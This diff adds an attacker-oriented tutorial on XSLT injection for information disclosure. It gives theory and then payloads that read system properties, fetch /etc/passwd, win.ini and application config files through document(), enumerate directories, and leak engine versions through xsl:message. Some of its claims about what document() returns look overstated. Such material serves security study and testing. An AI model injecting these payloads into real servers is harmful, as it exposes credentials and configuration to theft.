@@ -1,0 +1,115 @@
+---
+title: 'XSLT Injection: Information Disclosure Explained'
+description: Learn about XSLT injection techniques for information disclosure, including
+  environment variable extraction and file access.
+keywords:
+- XSLT injection
+- information disclosure
+- environment variables
+- file access
+- system properties
+- sensitive data
+- security vulnerabilities
+- configuration files
+- XML transformation
+---
+
+# Information Disclosure
+
+## Context
+
+This article aims to demonstrate how attackers can leverage XSLT (Extensible Stylesheet Language Transformations) injection to disclose sensitive information from server environments. By crafting specific XSLT payloads, attackers can extract data such as environment variables, system properties, file contents, and more. This knowledge assumes familiarity with XSLT processing, XML parsing, HTTP requests, and the basics of XSLT Injection.
+
+## Theory
+
+### XSLT Transformation and Information Exposure
+
+XSLT is a language primarily used to transform XML data into different formats. However, when an application improperly handles user-supplied XSLT or XML, an attacker could inject XSLT code that accesses sensitive server-side resources. If XSLT processors are not sandboxed correctly, they might expose various system properties, environment variables, and contents of files.
+
+In a typical attack sequence, the attacker injects XSLT code to access or enumerate sensitive data through the transformation's output.
+
+### Sensitive Data Accessible via XSLT Injection
+
+The vulnerability arises from the unrestricted use of XSLT functions such as `document()` and `system-property()`, which, if executed on the server, can return sensitive information. The injected XSLT executes on the server, and any extracted data is often returned via the HTTP response. This scenario assumes that the application trusts user-supplied XSLT or XML input, thus permitting arbitrary execution of templates and leading to potential information disclosure.
+
+### Common Disclosure Vectors in XSLT Injection
+
+Typical targets for XSLT injection in information disclosure attacks include environment variables, system properties, file contents, directory listings, and configuration files. Crafted XSLT payloads can be designed to enumerate files, extract environment variables, or reveal sensitive configuration data.
+
+## Practice
+
+### Extracting Environment Variables via XSLT Injection
+
+To extract environment variables and system properties using XSLT Injection, attackers can execute carefully crafted payloads like these:
+
+- Retrieve the operating system's name:
+  ```xml
+  <xsl:value-of select="system-property('os.name')"/>
+  ```
+
+- Discover the home directory of the user running the process:
+  ```xml
+  <xsl:value-of select="system-property('user.home')"/>
+  ```
+
+Upon executing these payloads, the attacker obtains critical environment or system property values from the server.
+
+### Reading Arbitrary Files with `document()`
+
+The `document()` function in XSLT can be misused to access arbitrary files on the server:
+
+- Attempt to read the contents of `/etc/passwd` on a Unix-like system:
+  ```xml
+  <xsl:value-of select="document('/etc/passwd')"/>
+  ```
+
+- Attempt to read the contents of `win.ini` on a Windows system:
+  ```xml
+  <xsl:value-of select="document('C:/Windows/win.ini')"/>
+  ```
+
+Through these payloads, attackers can retrieve file contents directly from the server's filesystem.
+
+### Directory Listing and File Enumeration via XSLT
+
+An attacker might list files and directories using an XSLT payload designed for enumeration:
+
+- Enumerate files and directories under `/etc/` on Unix-like systems:
+  ```xml
+  <xsl:for-each select="document('file:///etc/')/*">
+      <xsl:value-of select="name()"/>
+      <xsl:text>&#10;</xsl:text>
+  </xsl:for-each>
+  ```
+
+Executing this payload allows the attacker to enumerate the files and directories present on the server.
+
+### Leaking Application Configuration via XSLT
+
+Sensitive application configurations can be exposed by reading configuration files:
+
+- Attempt to read an application's configuration file:
+  ```xml
+  <xsl:value-of select="document('/path/to/application/config.xml')"/>
+  ```
+
+This technique provides the attacker access to application configurations or secrets embedded within the files.
+
+### Exposing XSLT Debug Information
+
+XSLT's debugging capabilities can also be leveraged to disclose server details:
+
+- Force XSLT processor to display debug information:
+  ```xml
+  <xsl:message terminate="no">Debug: 
+      <xsl:value-of select="system-property('java.version')"/>
+  </xsl:message>
+  ```
+
+Such a payload can help the attacker gain insights into the server environment and specifics about the XSLT engine in use.
+
+## Tools
+
+- **Burp Suite**
+- **curl**
+- **xsltproc**
